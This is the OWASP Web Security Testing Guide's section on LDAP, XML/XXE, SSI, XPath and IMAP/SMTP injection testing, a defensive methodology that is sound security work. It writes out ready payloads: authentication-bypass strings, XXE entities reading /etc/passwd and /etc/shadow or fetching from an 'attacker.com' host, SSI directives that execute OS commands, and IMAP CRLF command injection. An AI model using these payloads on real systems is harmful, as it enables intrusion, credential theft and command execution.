# WSTG INPV (Input Validation) — LDAP, XML, XPath, SSI & Mail Injection

OWASP Web Security Testing Guide v4.2. Subset of the Input Validation category (injection into non-SQL backend interpreters and parsers). 5 test cases: WSTG-INPV-06, WSTG-INPV-07, WSTG-INPV-08, WSTG-INPV-09, WSTG-INPV-10.

## Table of Contents

- [WSTG-INPV-06 — Testing for LDAP Injection](#wstg-inpv-06)
- [WSTG-INPV-07 — Testing for XML Injection](#wstg-inpv-07)
- [WSTG-INPV-08 — Testing for SSI Injection](#wstg-inpv-08)
- [WSTG-INPV-09 — Testing for XPath Injection](#wstg-inpv-09)
- [WSTG-INPV-10 — Testing for IMAP SMTP Injection](#wstg-inpv-10)

---

## WSTG-INPV-06

**Testing for LDAP Injection**

Summary
The Lightweight Directory Access Protocol (LDAP) is used to store information about users, hosts, and many other
objects. LDAP injection is a server-side attack, which could allow sensitive information about users and hosts
represented in an LDAP structure to be disclosed, modified, or inserted. This is done by manipulating input parameters
afterwards passed to internal search, add, and modify functions.
A web application could use LDAP in order to let users authenticate or search other users' information inside a
corporate structure. The goal of LDAP injection attacks is to inject LDAP search filters metacharacters in a query which
will be executed by the application.
Rfc2254 defines a grammar on how to build a search filter on LDAPv3 and extends Rfc1960 (LDAPv2).
An LDAP search filter is constructed in Polish notation, also known as Polish notation prefix notation.
This means that a pseudo code condition on a search filter like this:
find("cn=John & userPassword=mypass")

will be represented as:
find("(&(cn=John)(userPassword=mypass))")

Boolean conditions and group aggregations on an LDAP search filter could be applied by using the following
metacharacters:
Metachar

Meaning

&

Boolean AND

|

Boolean OR

!

Boolean NOT

=

Equals

~=

Approx

>=

Greater than

<=

Less than

*

Any character

()

Grouping parenthesis

More complete examples on how to build a search filter can be found in the related RFC.
A successful exploitation of an LDAP injection vulnerability could allow the tester to:
Access unauthorized content

Evade application restrictions
Gather unauthorized informations
Add or modify Objects inside LDAP tree structure.

Test Objectives
Identify LDAP injection points.
Assess the severity of the injection.

How to Test
Example 1: Search Filters
Let's suppose we have a web application using a search filter like the following one:
searchfilter="(cn="+user+")"

which is instantiated by an HTTP request like this:
http://www.example.com/ldapsearch?user=John

If the value John is replaced with a * , by sending the request:
http://www.example.com/ldapsearch?user=*

the filter will look like:
searchfilter="(cn=*)"

which matches every object with a 'cn' attribute equals to anything.
If the application is vulnerable to LDAP injection, it will display some or all of the user's attributes, depending on the
application's execution flow and the permissions of the LDAP connected user.
A tester could use a trial-and-error approach, by inserting in the parameter ( , | , & , * and the other characters, in
order to check the application for errors.

Example 2: Login
If a web application uses LDAP to check user credentials during the login process and it is vulnerable to LDAP
injection, it is possible to bypass the authentication check by injecting an always true LDAP query (in a similar way to
SQL and XPATH injection ).
Let's suppose a web application uses a filter to match LDAP user/password pair.
searchlogin= "(&(uid="+user+")(userpassword={md5}"+base64(pack("h*"md5(pass)))+"))";

By using the following values:

user=*)(uid=*))(|(uid=*
pass=password

the search filter will results in:
searchlogin="(&(uid=*)(uid=*))(|(uid=*)(userPassword={MD5}X03MO1qnZdYdgyfeuILPmQ==))";

which is correct and always true. This way, the tester will gain logged-in status as the first user in LDAP tree.

Tools
Softerra LDAP Browser

References
LDAP Injection Prevention Cheat Sheet

Whitepapers
Sacha Faust: LDAP Injection: Are Your Applications Vulnerable?
IBM paper: Understanding LDAP
RFC 1960: A String Representation of LDAP Search Filters
LDAP injection

---

## WSTG-INPV-07

**Testing for XML Injection**

Summary
XML Injection testing is when a tester tries to inject an XML doc to the application. If the XML parser fails to contextually
validate data, then the test will yield a positive result.
This section describes practical examples of XML Injection. First, an XML style communication will be defined and its
working principles explained. Then, the discovery method in which we try to insert XML metacharacters. Once the first
step is accomplished, the tester will have some information about the XML structure, so it will be possible to try to inject
XML data and tags (Tag Injection).

Test Objectives
Identify XML injection points.
Assess the types of exploits that can be attained and their severities.

How to Test
Let's suppose there is a web application using an XML style communication in order to perform user registration. This
is done by creating and adding a new user> node in an xmlDb file.
Let's suppose the xmlDB file is like the following:

<?xml version="1.0" encoding="ISO-8859-1"?>
<users>
<user>
<username>gandalf</username>
<password>!c3</password>
<userid>0</userid>
<mail>gandalf@middleearth.com</mail>
</user>
<user>
<username>Stefan0</username>
<password>w1s3c</password>
<userid>500</userid>
<mail>Stefan0@whysec.hmm</mail>
</user>
</users>

When a user registers himself by filling an HTML form, the application receives the user's data in a standard request,
which, for the sake of simplicity, will be supposed to be sent as a GET request.
For example, the following values:

Username: tony
Password: Un6R34kb!e
E-mail: s4tan@hell.com

will produce the request:

http://www.example.com/addUser.php?username=tony&password=Un6R34kb!e&email=s4tan@hell.com

The application, then, builds the following node:

<user>
<username>tony</username>
<password>Un6R34kb!e</password>
<userid>500</userid>
<mail>s4tan@hell.com</mail>
</user>

which will be added to the xmlDB:

<?xml version="1.0" encoding="ISO-8859-1"?>
<users>
<user>
<username>gandalf</username>
<password>!c3</password>
<userid>0</userid>
<mail>gandalf@middleearth.com</mail>
</user>
<user>
<username>Stefan0</username>
<password>w1s3c</password>
<userid>500</userid>
<mail>Stefan0@whysec.hmm</mail>
</user>
<user>
<username>tony</username>
<password>Un6R34kb!e</password>
<userid>500</userid>
<mail>s4tan@hell.com</mail>
</user>
</users>

Discovery
The first step in order to test an application for the presence of a XML Injection vulnerability consists of trying to insert
XML metacharacters.
XML metacharacters are:
Single quote: ' - When not sanitized, this character could throw an exception during XML parsing, if the injected
value is going to be part of an attribute value in a tag.
As an example, let's suppose there is the following attribute:
<node attrib='$inputValue'/>

So, if:
inputValue = foo'

is instantiated and then is inserted as the attrib value:
<node attrib='foo''/>

then, the resulting XML document is not well formed.

Double quote: " - this character has the same meaning as single quote and it could be used if the attribute value
is enclosed in double quotes.
<node attrib="$inputValue"/>

So if:
$inputValue = foo"

the substitution gives:
<node attrib="foo""/>

and the resulting XML document is invalid.
Angular parentheses: > and < - By adding an open or closed angular parenthesis in a user input like the
following:
Username = foo<

the application will build a new node:

<user>
<username>foo<</username>
<password>Un6R34kb!e</password>
<userid>500</userid>
<mail>s4tan@hell.com</mail>
</user>

but, because of the presence of the open '<', the resulting XML document is invalid.
Comment tag: <!--/--> - This sequence of characters is interpreted as the beginning/end of a comment. So by
injecting one of them in Username parameter:
Username = foo<!--

the application will build a node like the following:

<user>
<username>foo<!--</username>
<password>Un6R34kb!e</password>
<userid>500</userid>
<mail>s4tan@hell.com</mail>
</user>

which won't be a valid XML sequence.
Ampersand: & - The ampersand is used in the XML syntax to represent entities. The format of an entity is
&symbol; . An entity is mapped to a character in the Unicode character set.
For example:
<tagnode>&lt;</tagnode>

is well formed and valid, and represents the < ASCII character.

If & is not encoded itself with &amp; , it could be used to test XML injection.
In fact, if an input like the following is provided:
Username = &foo

a new node will be created:

<user>
<username>&foo</username>
<password>Un6R34kb!e</password>
<userid>500</userid>
<mail>s4tan@hell.com</mail>
</user>

but, again, the document is not valid: &foo is not terminated with ; and the &foo; entity is undefined.
CDATA section delimiters: <!\[CDATA\[ / ]]> - CDATA sections are used to escape blocks of text containing
characters which would otherwise be recognized as markup. In other words, characters enclosed in a CDATA
section are not parsed by an XML parser.
For example, if there is the need to represent the string <foo> inside a text node, a CDATA section may be used:

<node>
<![CDATA[<foo>]]>
</node>

so that <foo> won't be parsed as markup and will be considered as character data.
If a node is created in the following way:
<username><![CDATA[<$userName]]></username>

the tester could try to inject the end CDATA string ]]> in order to try to invalidate the XML document.
userName = ]]>

this will become:
<username><![CDATA[]]>]]></username>

which is not a valid XML fragment.
Another test is related to CDATA tag. Suppose that the XML document is processed to generate an HTML page. In this
case, the CDATA section delimiters may be simply eliminated, without further inspecting their contents. Then, it is
possible to inject HTML tags, which will be included in the generated page, completely bypassing existing sanitization
routines.
Let's consider a concrete example. Suppose we have a node containing some text that will be displayed back to the
user.

<html>
$HTMLCode
</html>

Then, an attacker can provide the following input:
$HTMLCode = <![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>]]>

and obtain the following node:

<html>
<![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>]]>
</html>

During the processing, the CDATA section delimiters are eliminated, generating the following HTML code:

<script>
alert('XSS')
</script>

The result is that the application is vulnerable to XSS.
External Entity: The set of valid entities can be extended by defining new entities. If the definition of an entity is a URI,
the entity is called an external entity. Unless configured to do otherwise, external entities force the XML parser to
access the resource specified by the URI, e.g., a file on the local machine or on a remote systems. This behavior
exposes the application to XML eXternal Entity (XXE) attacks, which can be used to perform denial of service of the
local system, gain unauthorized access to files on the local machine, scan remote machines, and perform denial of
service of remote systems.
To test for XXE vulnerabilities, one can use the following input:

<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///dev/random" >]>
<foo>&xxe;</foo>

This test could crash the web server (on a UNIX system), if the XML parser attempts to substitute the entity with the
contents of the /dev/random file.
Other useful tests are the following:

<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/shadow" >]><foo>&xxe;</foo>
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "http://www.attacker.com/text.txt" >]><foo>&xxe;</foo>

Tag Injection

Once the first step is accomplished, the tester will have some information about the structure of the XML document.
Then, it is possible to try to inject XML data and tags. We will show an example of how this can lead to a privilege
escalation attack.
Let's considering the previous application. By inserting the following values:

Username: tony
Password: Un6R34kb!e
E-mail: s4tan@hell.com</mail><userid>0</userid><mail>s4tan@hell.com

the application will build a new node and append it to the XML database:

<?xml version="1.0" encoding="ISO-8859-1"?>
<users>
<user>
<username>gandalf</username>
<password>!c3</password>
<userid>0</userid>
<mail>gandalf@middleearth.com</mail>
</user>
<user>
<username>Stefan0</username>
<password>w1s3c</password>
<userid>500</userid>
<mail>Stefan0@whysec.hmm</mail>
</user>
<user>
<username>tony</username>
<password>Un6R34kb!e</password>
<userid>500</userid>
<mail>s4tan@hell.com</mail>
<userid>0</userid>
<mail>s4tan@hell.com</mail>
</user>
</users>

The resulting XML file is well formed. Furthermore, it is likely that, for the user tony, the value associated with the userid
tag is the one appearing last, i.e., 0 (the admin ID). In other words, we have injected a user with administrative
privileges.
The only problem is that the userid tag appears twice in the last user node. Often, XML documents are associated with
a schema or a DTD and will be rejected if they don't comply with it.
Let's suppose that the XML document is specified by the following DTD:

<!DOCTYPE users [
<!ELEMENT users (user+) >
<!ELEMENT user (username,password,userid,mail+) >
<!ELEMENT username (#PCDATA) >
<!ELEMENT password (#PCDATA) >
<!ELEMENT userid (#PCDATA) >
<!ELEMENT mail (#PCDATA) >
]>

Note that the userid node is defined with cardinality 1. In this case, the attack we have shown before (and other simple
attacks) will not work, if the XML document is validated against its DTD before any processing occurs.

However, this problem can be solved, if the tester controls the value of some nodes preceding the offending node
(userid, in this example). In fact, the tester can comment out such node, by injecting a comment start/end sequence:

Username: tony
Password: Un6R34kb!e</password><!-E-mail: --><userid>0</userid><mail>s4tan@hell.com

In this case, the final XML database is:

<?xml version="1.0" encoding="ISO-8859-1"?>
<users>
<user>
<username>gandalf</username>
<password>!c3</password>
<userid>0</userid>
<mail>gandalf@middleearth.com</mail>
</user>
<user>
<username>Stefan0</username>
<password>w1s3c</password>
<userid>500</userid>
<mail>Stefan0@whysec.hmm</mail>
</user>
<user>
<username>tony</username>
<password>Un6R34kb!e</password><!--</password>
<userid>500</userid>
<mail>--><userid>0</userid><mail>s4tan@hell.com</mail>
</user>
</users>

The original userid node has been commented out, leaving only the injected one. The document now complies with
its DTD rules.

Source Code Review
The following Java API may be vulnerable to XXE if they are not configured properly.

javax.xml.parsers.DocumentBuilder
javax.xml.parsers.DocumentBuildFactory
org.xml.sax.EntityResolver
org.dom4j.*
javax.xml.parsers.SAXParser
javax.xml.parsers.SAXParserFactory
TransformerFactory
SAXReader
DocumentHelper
SAXBuilder
SAXParserFactory
XMLReaderFactory
XMLInputFactory
SchemaFactory
DocumentBuilderFactoryImpl
SAXTransformerFactory
DocumentBuilderFactoryImpl
XMLReader
Xerces: DOMParser, DOMParserImpl, SAXParser, XMLParser

Check source code if the docType, external DTD, and external parameter entities are set as forbidden uses.

XML External Entity (XXE) Prevention Cheat Sheet
In addition, the Java POI office reader may be vulnerable to XXE if the version is under 3.10.1.
The version of POI library can be identified from the filename of the JAR. For example,
poi-3.8.jar
poi-ooxml-3.8.jar

The followings source code keyword may apply to C.
libxml2: xmlCtxtReadMemory,xmlCtxtUseOptions,xmlParseInNodeContext,xmlReadDoc,xmlReadFd,xmlReadFile
,xmlReadIO,xmlReadMemory, xmlCtxtReadDoc ,xmlCtxtReadFd,xmlCtxtReadFile,xmlCtxtReadIO
libxerces-c: XercesDOMParser, SAXParser, SAX2XMLReader

Tools
XML Injection Fuzz Strings (from wfuzz tool)

References
XML Injection
Gregory Steuck, "XXE (Xml eXternal Entity) attack"
OWASP XXE Prevention Cheat Sheet

---

## WSTG-INPV-08

**Testing for SSI Injection**

Summary
Web servers usually give developers the ability to add small pieces of dynamic code inside static HTML pages, without
having to deal with full-fledged server-side or client-side languages. This feature is provided by Server-Side
Includes(SSI).
Server-Side Includes are directives that the web server parses before serving the page to the user. They represent an
alternative to writing CGI programs or embedding code using server-side scripting languages, when there's only need
to perform very simple tasks. Common SSI implementations provide directives (commands) to include external files, to
set and print web server CGI environment variables, or to execute external CGI scripts or system commands.
SSI can lead to a Remote Command Execution (RCE), however most webservers have the exec directive disabled by
default.
This is a vulnerability very similar to a classical scripting language injection vulnerability. One mitigation is that the web
server needs to be configured to allow SSI. On the other hand, SSI injection vulnerabilities are often simpler to exploit,
since SSI directives are easy to understand and, at the same time, quite powerful, e.g., they can output the content of
files and execute system commands.

Test Objectives
Identify SSI injection points.
Assess the severity of the injection.

How to Test
To test for exploitable SSI, inject SSI directives as user input. If SSI are enabled and user input validation has not been
properly implemented, the server will execute the directive. This is very similar to a classical scripting language
injection vulnerability in that it occurs when user input is not properly validated and sanitized.
First determine if the web server supports SSI directives. Often, the answer is yes, as SSI support is quite common. To
determine if SSI directives are supported, discover the type of web server that the target is running using information
gathering techniques (see Fingerprint Web Server). If you have access to the code, determine if SSI directives are used
by searching through the webserver configuration files for specific keywords.
Another way of verifying that SSI directives are enabled is by checking for pages with the .shtml extension, which is
associated with SSI directives. The use of the .shtml extension is not mandatory, so not having found any .shtml
files doesn't necessarily mean that the target is not vulnerable to SSI injection attacks.
The next step is determining all the possible user input vectors and testing to see if the SSI injection is exploitable.
First find all the pages where user input is allowed. Possible input vectors may also include headers and cookies.
Determine how the input is stored and used, i.e if the input is returned as an error message or page element and if it
was modified in some way. Access to the source code can help you to more easily determine where the input vectors
are and how input is handled.
Once you have a list of potential injection points, you may determine if the input is correctly validated. Ensure it is
possible to inject characters used in SSI directives such as <!#=/."-> and [a-zA-Z0-9]

The below example returns the value of the variable. The references section has helpful links with server-specific
documentation to help you better assess a particular system.

<!--#echo var="VAR" -->

When using the include directive, if the supplied file is a CGI script, this directive will include the output of the CGI
script. This directive may also be used to include the content of a file or list files in a directory:

<!--#include virtual="FILENAME" -->

To return the output of a system command:

<!--#exec cmd="OS_COMMAND" -->

If the application is vulnerable, the directive is injected and it would be interpreted by the server the next time the page
is served.
The SSI directives can also be injected in the HTTP headers, if the web application is using that data to build a
dynamically generated page:

GET / HTTP/1.1
Host: www.example.com
Referer: <!--#exec cmd="/bin/ps ax"-->
User-Agent: <!--#include virtual="/proc/version"-->

Tools
Web Proxy Burp Suite
OWASP ZAP
String searcher: grep

References
Nginx SSI module
Apache: Module mod_include
IIS: Server Side Includes directives
Apache Tutorial: Introduction to Server Side Includes
Apache: Security Tips for Server Configuration
SSI Injection instead of JavaScript Malware
IIS: Notes on Server-Side Includes (SSI) syntax
Header Based Exploitation

---

## WSTG-INPV-09

**Testing for XPath Injection**

Summary
XPath is a language that has been designed and developed primarily to address parts of an XML document. In XPath
injection testing, we test if it is possible to inject XPath syntax into a request interpreted by the application, allowing an
attacker to execute user-controlled XPath queries. When successfully exploited, this vulnerability may allow an attacker
to bypass authentication mechanisms or access information without proper authorization.
Web applications heavily use databases to store and access the data they need for their operations. Historically,
relational databases have been by far the most common technology for data storage, but, in the last years, we are
witnessing an increasing popularity for databases that organize data using the XML language. Just like relational
databases are accessed via SQL language, XML databases use XPath as their standard query language.
Since, from a conceptual point of view, XPath is very similar to SQL in its purpose and applications, an interesting result
is that XPath injection attacks follow the same logic as SQL Injection attacks. In some aspects, XPath is even more
powerful than standard SQL, as its whole power is already present in its specifications, whereas a large number of the
techniques that can be used in a SQL Injection attack depend on the characteristics of the SQL dialect used by the
target database. This means that XPath injection attacks can be much more adaptable and ubiquitous. Another
advantage of an XPath injection attack is that, unlike SQL, no ACLs are enforced, as our query can access every part of
the XML document.

Test Objectives
Identify XPATH injection points.

How to Test
The XPath attack pattern was first published by Amit Klein and is very similar to the usual SQL Injection. In order to get
a first grasp of the problem, let's imagine a login page that manages the authentication to an application in which the
user must enter their username and password. Let's assume that our database is represented by the following XML file:

<?xml version="1.0" encoding="ISO-8859-1"?>
<users>
<user>
<username>gandalf</username>
<password>!c3</password>
<account>admin</account>
</user>
<user>
<username>Stefan0</username>
<password>w1s3c</password>
<account>guest</account>
</user>
<user>
<username>tony</username>
<password>Un6R34kb!e</password>
<account>guest</account>
</user>
</users>

An XPath query that returns the account whose username is gandalf and the password is !c3 would be the
following:
string(//user[username/text()='gandalf' and password/text()='!c3']/account/text())

If the application does not properly filter user input, the tester will be able to inject XPath code and interfere with the
query result. For instance, the tester could input the following values:

Username: ' or '1' = '1
Password: ' or '1' = '1

Looks quite familiar, doesn't it? Using these parameters, the query becomes:
string(//user[username/text()='' or '1' = '1' and password/text()='' or '1' = '1']/account/text())

As in a common SQL Injection attack, we have created a query that always evaluates to true, which means that the
application will authenticate the user even if a username or a password have not been provided. And as in a common
SQL Injection attack, with XPath injection, the first step is to insert a single quote ( ' ) in the field to be tested,
introducing a syntax error in the query, and to check whether the application returns an error message.
If there is no knowledge about the XML data internal details and if the application does not provide useful error
messages that help us reconstruct its internal logic, it is possible to perform a Blind XPath Injection attack, whose goal
is to reconstruct the whole data structure. The technique is similar to inference based SQL Injection, as the approach is
to inject code that creates a query that returns one bit of information. Blind XPath Injection is explained in more detail by
Amit Klein in the referenced paper.

References
Whitepapers
Amit Klein: "Blind XPath Injection"
XPath 1.0 specifications

---

## WSTG-INPV-10

**Testing for IMAP SMTP Injection**

Summary
This threat affects all applications that communicate with mail servers (IMAP/SMTP), generally webmail applications.
The aim of this test is to verify the capacity to inject arbitrary IMAP/SMTP commands into the mail servers, due to input
data not being properly sanitized.
The IMAP/SMTP Injection technique is more effective if the mail server is not directly accessible from Internet. Where
full communication with the backend mail server is possible, it is recommended to conduct direct testing.
An IMAP/SMTP Injection makes it possible to access a mail server which otherwise would not be directly accessible
from the Internet. In some cases, these internal systems do not have the same level of infrastructure security and
hardening that is applied to the front-end web servers. Therefore, mail server results may be more vulnerable to attacks
by end users (see the scheme presented in Figure 1).

Figure 4.7.10-1: Communication with the mail servers using the IMAP/SMTP Injection technique

Figure 1 depicts the flow of traffic generally seen when using webmail technologies. Step 1 and 2 is the user interacting
with the webmail client, whereas step 2 is the tester bypassing the webmail client and interacting with the back-end
mail servers directly.
This technique allows a wide variety of actions and attacks. The possibilities depend on the type and scope of injection
and the mail server technology being tested.
Some examples of attacks using the IMAP/SMTP Injection technique are:
Exploitation of vulnerabilities in the IMAP/SMTP protocol
Application restrictions evasion
Anti-automation process evasion
Information leaks
Relay/SPAM

Test Objectives
Identify IMAP/SMTP injection points.
Understand the data flow and deployment structure of the system.

Assess the injection impacts.

How to Test
Identifying Vulnerable Parameters
In order to detect vulnerable parameters, the tester has to analyze the application's ability in handling input. Input
validation testing requires the tester to send bogus, or malicious, requests to the server and analyse the response. In a
secure application, the response should be an error with some corresponding action telling the client that something
has gone wrong. In a vulnerable application, the malicious request may be processed by the back-end application that
will answer with a HTTP 200 OK response message.
It is important to note that the requests being sent should match the technology being tested. Sending SQL injection
strings for Microsoft SQL server when a MySQL server is being used will result in false positive responses. In this case,
sending malicious IMAP commands is modus operandi since IMAP is the underlying protocol being tested.
IMAP special parameters that should be used are:
On the IMAP server

On the SMTP server

Authentication

Emissor email

operations with mail boxes (list, read, create, delete, rename)

Destination email

operations with messages (read, copy, move, delete)

Subject

Disconnection

Message body
Attached files

In this example, the "mailbox" parameter is being tested by manipulating all requests with the parameter in:
http://<webmail>/src/read_body.php?mailbox=INBOX&passed_id=46106&startMessage=1

The following examples can be used.
Assign a null value to the parameter:
http://<webmail>/src/read_body.php?mailbox=&passed_id=46106&startMessage=1

Substitute the value with a random value:
http://<webmail>/src/read_body.php?mailbox=NOTEXIST&passed_id=46106&startMessage=1

Add other values to the parameter:
http://<webmail>/src/read_body.php?mailbox=INBOX PARAMETER2&passed_id=46106&startMessage=1

Add non standard special characters (i.e.: \ , ' , " , @ , # , ! , | ):
http://<webmail>/src/read_body.php?mailbox=INBOX"&passed_id=46106&startMessage=1

Eliminate the parameter:
http://<webmail>/src/read_body.php?passed_id=46106&startMessage=1

The final result of the above testing gives the tester three possible situations: S1 - The application returns a error
code/message S2 - The application does not return an error code/message, but it does not realize the requested
operation S3 - The application does not return an error code/message and realizes the operation requested normally

Situations S1 and S2 represent successful IMAP/SMTP injection.
An attacker's aim is receiving the S1 response, as it is an indicator that the application is vulnerable to injection and
further manipulation.
Let's suppose that a user retrieves the email headers using the following HTTP request:
http://<webmail>/src/view_header.php?mailbox=INBOX&passed_id=46105&passed_ent_id=0

An attacker might modify the value of the parameter INBOX by injecting the character " (%22 using URL encoding):
http://<webmail>/src/view_header.php?mailbox=INBOX%22&passed_id=46105&passed_ent_id=0

In this case, the application answer may be:

ERROR: Bad or malformed request.
Query: SELECT "INBOX""
Server responded: Unexpected extra arguments to Select

The situation S2 is harder to test successfully. The tester needs to use blind command injection in order to determine if
the server is vulnerable.
On the other hand, the last situation (S3) is not revelant in this paragraph.
List of vulnerable parameters
Affected functionality
Type of possible injection (IMAP/SMTP)

Understanding the Data Flow and Deployment Structure of the Client
After identifying all vulnerable parameters (for example, passed_id ), the tester needs to determine what level of
injection is possible and then design a testing plan to further exploit the application.
In this test case, we have detected that the application's passed_id parameter is vulnerable and is used in the
following request:
http://<webmail>/src/read_body.php?mailbox=INBOX&passed_id=46225&startMessage=1

Using the following test case (providing an alphabetical value when a numerical value is required):
http://<webmail>/src/read_body.php?mailbox=INBOX&passed_id=test&startMessage=1

will generate the following error message:

ERROR : Bad or malformed request.
Query: FETCH test:test BODY[HEADER]
Server responded: Error in IMAP command received by server.

In this example, the error message returned the name of the executed command and the corresponding parameters.
In other situations, the error message ( not controlled by the application) contains the name of the executed
command, but reading the suitable RFC allows the tester to understand what other possible commands can be
executed.

If the application does not return descriptive error messages, the tester needs to analyze the affected functionality to
deduce all the possible commands (and parameters) associated with the above mentioned functionality. For example, if
a vulnerable parameter has been detected in the create mailbox functionality, it is logical to assume that the affected
IMAP command is CREATE . According to the RFC, the CREATE command accepts one parameter which specifies the
name of the mailbox to create.
List of IMAP/SMTP commands affected
Type, value, and number of parameters expected by the affected IMAP/SMTP commands

IMAP/SMTP Command Injection
Once the tester has identified vulnerable parameters and has analyzed the context in which they are executed, the next
stage is exploiting the functionality.
This stage has two possible outcomes:
1. The injection is possible in an unauthenticated state: the affected functionality does not require the user to be
authenticated. The injected (IMAP) commands available are limited to: CAPABILITY , NOOP , AUTHENTICATE ,
LOGIN , and LOGOUT .
2. The injection is only possible in an authenticated state: the successful exploitation requires the user to be fully
authenticated before testing can continue.
In any case, the typical structure of an IMAP/SMTP Injection is as follows:
Header: ending of the expected command;
Body: injection of the new command;
Footer: beginning of the expected command.
It is important to remember that, in order to execute an IMAP/SMTP command, the previous command must be
terminated with the CRLF ( %0d%0a ) sequence.
Let's suppose that in the Identifying vulnerable parameters stage, the attacker detects that the parameter message_id
in the following request is vulnerable:
http://<webmail>/read_email.php?message_id=4791

Let's suppose also that the outcome of the analysis performed in the stage 2 ("Understanding the data flow and
deployment structure of the client") has identified the command and arguments associated with this parameter as:
FETCH 4791 BODY[HEADER]

In this scenario, the IMAP injection structure would be:
http://<webmail>/read_email.php?message_id=4791 BODY[HEADER]%0d%0aV100 CAPABILITY%0d%0aV101 FETCH 4791

Which would generate the following commands:

???? FETCH 4791 BODY[HEADER]
V100 CAPABILITY
V101 FETCH 4791 BODY[HEADER]

where:

Header = 4791 BODY[HEADER]
Body
= %0d%0aV100 CAPABILITY%0d%0a
Footer = V101 FETCH 4791

List of IMAP/SMTP commands affected
Arbitrary IMAP/SMTP command injection

References
Whitepapers
RFC 0821 "Simple Mail Transfer Protocol"
RFC 3501 "Internet Message Access Protocol - Version 4rev1"
Vicente Aguilera Díaz: "MX Injection: Capturing and Exploiting Hidden Mail Servers"

---
